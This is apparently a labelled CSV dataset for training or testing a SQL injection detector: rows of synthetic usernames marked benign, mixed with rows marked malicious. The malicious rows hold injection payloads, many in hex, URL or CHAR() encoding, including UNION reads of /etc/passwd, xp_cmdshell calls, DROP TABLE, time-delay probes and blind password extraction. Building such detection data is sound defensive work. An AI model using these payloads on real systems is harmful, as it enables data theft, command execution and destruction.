name,is_malicious
jonessydney,0
gary43,0
daviddelgado,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
riveradavid,0
mbarnes,0
mmiller,0
bbeck,0
amy28,0
elliotteric,0
ronald05,0
alejandra23,0
paynejonathon,0
emily35,0
fheath,0
oliviabennett'%27%20OR%201=1--,1
wheelercatherine,0
kellyraymond0x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
christopherbest'; EXEC xp_cmdshell('dir')--,1
holtkimberly,0
' UNION SELECT * FROM users--,1
hfry,0
abigailreed,0
floresmark,0
bradleykidd,0
dwilson,0
'||'1'='1,1
deaton' OR '1'='1,1
michelecobb,0
CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
wilkinsonrobert0x270x7c0x7c0x270x310x270x3d0x270x31,1
jonathan20,0
tamara76,0
jacksontimothy,0
meganwerner,0
ortizjoshua,0
raymondlee'; EXEC xp_cmdshell('dir')--,1
matthew02,0
msilva,0
jasonnorton,0
codylopez,0
curtis59,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
sward,0
ccooper,0
ymorales,0
teresa52,0
dillonmatthew,0
johnsonpenny,0
garrettcohen,0
jennifernelson,0
jclark,0
duartetodd,0
cherylfoster' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
william78,0
jensenkatie,0
kelly00,0
marylong,0
larry22,0
tracygarner' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
timothy57' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
contrerascody,0
susanchapman,0
susancordova,0
gonzalezemma,0
andersonmargaret' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
ronaldberry,0
uryan,0
kingtony,0
gregoryleonard,0
alicia20,0
castrodavid,0
schmittadrian,0
carlos98,0
anthonyadams,0
ethanhansen,0
torreskevin,0
robertgordon,0
gutierrezdenise,0
paul83,0
iramos,0
gonzalezgregory' UNION SELECT * FROM users--,1
austinbest,0
gwilliams,0
lauren07,0
grantlori,0
zdavid,0
jmoore,0
0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
stephanienunez,0
tracy43,0
iharper,0
shannon81,0
charles75,0
marco75,0
garciacarlos,0
sean98,0
xnorman,0
teresa67,0
sarahhuynh,0
shannon40,0
mjohnson,0
raymondlisa,0
edwardbriggs' OR SOUNDEX('test')=SOUNDEX('test')--,1
smallchristopher,0
' OR BINARY 'a'='a'--,1
andrew02,0
yvette77'/**/OR/**/'1'='1,1
casey88,0
eberry,0
jamie45,0
zrowe,0
stuartjoseph,0
%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
karenlewis,0
michael30,0
uwashington,0
ashley49,0
ymanning,0
jturner,0
cshaffer,0
sheenahubbard,0
marcus67,0
jacksonpamela,0
stephensrichard,0
caitlingraham,0
' OR 0x50=0x50--,1
nathaniel54,0
jenkinsrandall,0
gamblechristopher,0
christopher27,0
amber76,0
kennedyjennifer,0
moonsteven,0
johnsoncharles'%20OR%201=1--,1
xroach,0
cortiz,0
crystal66,0
lauren41,0
sgrimes,0
ucase,0
' OR BINARY 'a'='a'--,1
cruzryan,0
trevor02,0
spencerzhang,0
jesus51,0
aburke,0
gdillon,0
dward,0
smithmichele,0
murphyaaron,0
perezjacob'; DROP TABLE users--,1
krobinson,0
leslie74,0
tammy93,0
kweaver,0
reginald13,0
jameshenson'||'1'='1,1
danielwhite,0
sullivantina,0
travis10,0
brianzhang,0
hilljohn%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
vhuang,0
jacob77,0
ksingleton,0
vanessa30,0
glennpatterson%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
darin69,0
george68,0
jason95,0
fturner,0
timothy95,0
gomezdeborah,0
james36,0
charlessanchez,0
marcus84,0
danielgonzales,0
eduardo26,0
tsanchez,0
carolyn73,0
"derek54' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
hectorlowery,0
amymorgan,0
colliereric,0
adrianagomez,0
scott03,0
' OR 0x50=0x50--,1
cindywells,0
zhutchinson,0
andrewhahn,0
tanderson,0
nperry,0
christianbaker%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
cherylfleming,0
heathersmith,0
"jennifertaylor' OR BENCHMARK(10000000,MD5(NOW()))--",1
pmyers,0
cooperjohn,0
christinetaylor,0
danielterry,0
joshualopez,0
ewoods,0
chad29%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
ojames,0
warrensamuel,0
maria81,0
nancy58,0
btownsend,0
bakerstephen,0
jeremywells,0
catherineperez,0
jjohnson,0
danny18,0
katherineedwards,0
vhamilton,0
hannah52,0
gnunez,0
judy41,0
gregorybrown,0
dhudson,0
kathryn52,0
gibsonmark' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
thomasrichard,0
nicholascurry,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
smithtracey,0
christine25,0
andrewgonzalez,0
0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
' OR CHAR(49)=CHAR(49)--,1
stephaniewilson,0
jacobsanders,0
mitchell95,0
franklin63,0
asmith,0
tcosta,0
afoster,0
holmeskimberly,0
woodmelanie,0
trevor57,0
groberts,0
brenda61,0
hcarson,0
jennifer03,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
benjaminwilson,0
lewiskatherine,0
tharris,0
blankenshipjessica,0
jordansean,0
william99,0
foxbrandon,0
bsandoval,0
deborah86,0
osanchez' OR 1=1--,1
benjamin35,0
brian96,0
erin53,0
kayla02,0
dawn88,0
johnjohnston,0
kristen880x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
' UNION SELECT * FROM users--,1
christinacooper,0
katie71,0
gonzalesmichelle,0
nicholas88,0
kelsey36,0
xwilkerson,0
ortizbrian,0
'||'1'='1,1
gonzalesedgar,0
obutler,0
hayskyle,0
roberthernandez,0
brentmiller,0
parrishcharles,0
jason30,0
joel65,0
harriserin,0
peterstewart,0
angela48,0
dfowler,0
crystalford,0
lingram,0
odouglas,0
howellcorey,0
dariusfoster'%20OR%201=1--,1
adammatthews,0
alexis45CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
npowell,0
zimmermanlaura,0
jessica82,0
brodriguez,0
' OR BINARY 'a'='a'--,1
lclay,0
angel33,0
sperez,0
prodriguez,0
aowens,0
jamesdiaz,0
rshah,0
yblair,0
matthew88,0
berryjames,0
stephanievaldez,0
alyssa59,0
christopher52,0
parker80,0
deanstephanie,0
slane,0
anita95,0
gilestyler,0
tfernandez,0
laurengarrett,0
ylynch,0
anthonycoleman,0
julianmiller,0
kingjohn,0
schultzrichard,0
debradrake,0
matthewsuarez,0
itate,0
mary21,0
"amanda78' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
samuel98,0
tday,0
mbauer,0
albertthornton,0
lisa94,0
john07,0
' OR CHAR(49)=CHAR(49)--,1
ohall,0
lmiller,0
ricardosmall0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
guzmanjared,0
whitegregory,0
fcampos,0
moransarah' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
kristi92,0
kelsey18,0
' OR CHAR(49)=CHAR(49)--,1
fitzpatrickwayne,0
robertsonrichard,0
amy89,0
asingh,0
nsullivan,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
heather94,0
peteryoung,0
jnguyen,0
williamselizabeth,0
klowe,0
stephaniefrank,0
ewilliams,0
fwilliamson,0
jackie44,0
csmith,0
jasonclark,0
tina77,0
christopherbrown,0
carlaustin,0
annmartin,0
timothy87,0
katie66,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
murphybrenda,0
xjohnson,0
'; EXEC xp_cmdshell('dir')--,1
randallmorales,0
bradleychavez,0
darius48,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
torresjustin,0
maria40,0
veronica61,0
mario41,0
jared31' OR 0x50=0x50--,1
ydavis,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
christopher76,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lopezbrandon,0
jevans,0
brittany26,0
lisamunoz,0
tperkins' OR BINARY 'a'='a'--,1
mike90,0
lynnrobert,0
marcusmathis%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
jennifermartinez,0
kellystacy,0
kingmichael,0
dbuck,0
fischerjoanne,0
brian41,0
ygarza,0
ashleylynch,0
martinezjohn,0
gyang,0
emilyrandolph,0
crystal81,0
marvinarnold,0
zpeterson,0
yespinoza,0
' OR CHAR(49)=CHAR(49)--,1
martinezalan,0
gabriela19,0
kevin83,0
deanna04,0
samantha29,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
matthew93,0
karensanders,0
ryanduncan,0
pleon,0
gshah,0
walkernicole,0
floresjerry,0
hallmatthew,0
' OR 0x50=0x50--,1
melissahowe,0
angelicahuynh,0
daniel24,0
randybailey,0
gordonsharon,0
meganbrown,0
christopher18,0
ohouston,0
stephanie01,0
0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
jenkinsvirginia,0
gruiz,0
odouglas,0
andrea61,0
maryosborne,0
murphyevan,0
stokescharles,0
clarkerobert,0
michael12,0
steelemelissa,0
turnerrichard,0
thomasdarren,0
austin70,0
ybrown,0
pughdonna,0
gonzalezrobert,0
larry18,0
aaron69,0
ttaylor,0
fieldswayne,0
' OR 0x50=0x50--,1
melissa89,0
'/**/OR/**/'1'='1,1
andersonjohn'%20OR%201=1--,1
ynelson,0
bvincent' OR 0x50=0x50--,1
michelle72,0
ywilliamson,0
michaelbrown,0
lisapratt,0
carloslopez,0
dunndaniel,0
jeffrey20,0
ldowns%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
antonio04' OR 0x50=0x50--,1
patrickford,0
angelanelson,0
vbeasley,0
blackmonique,0
martinsteven,0
norrisdennis,0
froman,0
debrakelley,0
jason82,0
ibell,0
lopezjessica,0
heathersolomon,0
mark97,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
garciajose,0
russelldarius,0
karacooke,0
"aburgess'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
idodson,0
jacob68,0
isaiah39,0
camerongeorge,0
sean15,0
james66,0
melindamooney,0
huntkimberly,0
cody38,0
shawnsoto,0
tarasavage,0
nbennett,0
kellyvincent,0
gabriellehill,0
ylove,0
taylorjane,0
ljimenez,0
qmayo,0
victoria02,0
gordon76,0
'; EXEC xp_cmdshell('dir')--,1
ynorman,0
fulleralexandra,0
valenzueladanny,0
matthew03,0
eric22,0
idennis,0
bwilliamson,0
emilypatrick,0
hannaeric,0
matthewrodriguez,0
yolanda66,0
herreranicholas,0
anthonyharper,0
mayjoy,0
perkinselizabeth,0
christinareed,0
ehoffman,0
jgrant,0
lucas49,0
felicia71,0
wcruz,0
william77,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
monicapeterson0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
grahammary,0
bautistasamuel,0
david65,0
dayisaac,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
xwright,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
montgomerytheresa,0
wuwendy,0
ethanlin,0
shepherdholly,0
herringsteven,0
virginia39,0
singhjoshua,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
gibsonallison,0
evansmichael,0
carolyn76,0
lwood,0
jameswilliams'/**/OR/**/'1'='1,1
xsalas,0
baileysarah,0
jacobsonjohn,0
jonessusan'/**/OR/**/'1'='1,1
pfloyd,0
edwardsroberto,0
christinejohnson,0
courtney92,0
vgray,0
uhurley,0
sean99,0
collinsnancy,0
barbaraowens,0
taylorsmith,0
timothyrodriguez,0
xgutierrez,0
barbara99,0
bradleymartinez,0
bergpatrick,0
jessica69,0
barkerrita,0
brownbruce' OR 1=1--,1
daviddaltonCHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
mvaughn,0
pamela90,0
anthonyrosario,0
victoriavilla,0
blewis,0
nataliemitchell,0
steven21,0
monroejoshua,0
katherine84,0
elizabethturner,0
bpeterson,0
hflowers,0
omiller,0
xaguilar,0
trevinoshane'; DROP TABLE users--,1
laurapeterson,0
dylancarter,0
sheila15,0
estark,0
' OR '1'='1,1
amandasmith,0
pamela72,0
shannon14,0
'; EXEC xp_cmdshell('dir')--,1
briannawalters,0
charles70,0
johnsonthomas,0
kerry87,0
kkennedy,0
bryanseth,0
bennettashley,0
austinhernandez,0
sandersjudith,0
'/**/OR/**/'1'='1,1
0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
kennethberry,0
mitchellrobert,0
angel15,0
david28,0
colerivera,0
ltaylor,0
john69,0
lmayCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
nhayes,0
linda72,0
jasonnunez,0
jennifer88,0
stephanie63,0
jmendoza,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
scottquinn,0
morgandennis,0
tiffany92,0
marcia60,0
' OR BINARY 'a'='a'--,1
samanthabutlerCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
oreed,0
zmorales,0
stephanieunderwood,0
courtneygoodwin,0
kross,0
brianpowers,0
whitebrandon,0
imaxwell,0
anna58,0
scasey,0
woodwardjulia,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
' OR '1'='1,1
davisjames,0
dcunningham,0
morenopatrick,0
frederick35,0
smitchell,0
evanfischer,0
robinsonbrandon,0
deniserussell,0
bruce65,0
edavis,0
jonathanprince,0
anthony10,0
sarahlewis,0
kingmelissa,0
jennifer15,0
fjones,0
ashley51,0
corey46,0
iray,0
oscarsteele,0
robertgarcia' UNION SELECT * FROM users--,1
patrick76,0
wardphilip,0
mosleyjohn,0
stephanieflores,0
austin71,0
mariagonzalez,0
nbrown,0
taylordavid,0
sherrywood0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
nicholasvega,0
brownandrea,0
wandaramos,0
yhoover,0
montgomeryrebecca,0
melissa20,0
mcdonaldalexander,0
bradoconnor,0
cheryl97,0
anita88,0
margaretmorrow,0
laurarobinson,0
daniellelopez,0
lamberterik,0
pearsonwalter,0
ashley03,0
rlee,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
' OR 1=1--,1
chambersrobyn,0
scott45,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
dianataylor,0
ralvarez,0
%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
janet13,0
andradedouglas,0
kristina45,0
vperez,0
hurstashley,0
dvelez,0
rickeybest' OR CHAR(49)=CHAR(49)--,1
nicholas29,0
amycurtis,0
phillipsbradley,0
gmorris,0
' OR 1=1--,1
lindseycarr,0
'||'1'='1,1
rachelwise,0
cameronwilson,0
sbrown,0
christopherbartlett,0
christiedunlap,0
david87,0
vwilliams,0
hmeyers,0
lynchjanet,0
kevinbullock,0
christopher35,0
haleyhudsonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
wendy77,0
thomassheila' OR 0x50=0x50--,1
danaclark,0
'%27%20OR%201=1--,1
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
robertthompsonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
parkerrobert,0
david81,0
michelle48,0
fernandeztheresa,0
sflores,0
holly50,0
diazsean0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
christopherandersen,0
theresa33,0
zstewart,0
bartlettkatherine,0
0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
webermatthew,0
jasongriffin,0
georgeangela,0
caldwellderek,0
leahmorgan,0
tbryant,0
"tbush'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
pscott,0
keithskinner' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
bowenedwin,0
'; DROP TABLE users--,1
suttonanita,0
julie95,0
obuck,0
' OR 1=1--,1
courtney92%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
whiteashley,0
paul99,0
david77,0
katherineburton,0
beardcheyenne,0
aaron83,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
mlopez,0
maldonadohannah,0
richardthomas,0
cookmichael,0
jamesklein,0
pedrosnyder,0
meghan45,0
ashleyfletcher,0
brianwood,0
browntaylor,0
kristen04,0
ybell,0
' OR 1=1--,1
bhanson,0
lcunningham,0
brendaelliott,0
vsnyder,0
fjohnson,0
austinangela,0
david21,0
jmontoya,0
jroberts,0
cherylparker,0
nbates,0
sanchezheidi,0
fmccarthy,0
gomezwilliam,0
william36,0
"lambnicole' OR BENCHMARK(10000000,MD5(NOW()))--",1
jessedavis,0
jasmine46,0
christian69,0
melissa31,0
terriprice,0
'%20OR%201=1--,1
morrisvictoria,0
brookeriley,0
lindawade,0
jeremiah43,0
joshuachen,0
marykoch,0
apreston,0
anne20,0
thomaskaren,0
hannahsmith,0
ralphmcclure,0
kimberlymartin,0
michael79,0
obriengabriella,0
jamesthomas,0
udurham,0
alex26,0
seth10,0
nhill,0
nancyhart,0
yolanda81,0
rossamanda,0
kellygriffin,0
arodriguez,0
tylerscott,0
'%27%20OR%201=1--,1
amandariddle,0
sabrinaross,0
serranojacob,0
sheltonamy,0
steven47,0
jwilson,0
amy40,0
kiarapeterson,0
'; DROP TABLE users--,1
mvargas,0
elee,0
clarkzachary,0
popeallen,0
richard41,0
cynthiaandrews%27 %4f%52 %31%3d%31--,1
jonathan46'; EXEC xp_cmdshell('dir')--,1
rodriguezdonald,0
seth71,0
rjohnson,0
andreapham,0
sheilakelly,0
choisylvia,0
shaun28,0
heidi33,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
jennifer42,0
'; EXEC xp_cmdshell('dir')--,1
ematthews'; DROP TABLE users--,1
ryan14,0
james18,0
zparker,0
shortedward,0
burchbrianna,0
bryanrivers,0
nancyedwards,0
jdaniels,0
ugreen,0
zoe68,0
conniecox,0
james39,0
mschmidt,0
lvaughn,0
randycox,0
terrencemonroe,0
jonathanwilliams,0
garciamary'||'1'='1,1
shannonfoster,0
xkaiser,0
wmendez,0
kristina00,0
lucaschristopher,0
schneiderangela,0
michellewhite,0
garciaryan,0
sullivanrobert,0
xmartinez,0
"pmendez'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
randallharrell,0
emily83,0
daniellopez,0
ssilva,0
vclark' OR SOUNDEX('test')=SOUNDEX('test')--,1
pbarrett'%20OR%201=1--,1
hubbarderic,0
alexanderbriggs,0
ralphgarrett,0
warechristopher'; DROP TABLE users--,1
ashleepeterson,0
wyattvelez,0
racheltate,0
jaimegeorge,0
jrodriguez,0
katiewallace,0
walkerheather,0
chavezbrittany,0
mphillips,0
john34,0
guerrerobrian,0
morrisonvictor,0
reynoldsalexa,0
ethan32'; DROP TABLE users--,1
brightcarrie,0
dannylynch,0
granteric,0
griffinlisa,0
brownjanet,0
cknight' OR CHAR(49)=CHAR(49)--,1
%27 %4f%52 %31%3d%31--,1
abennett,0
joelgarza,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
corycolon,0
tylerschmitt,0
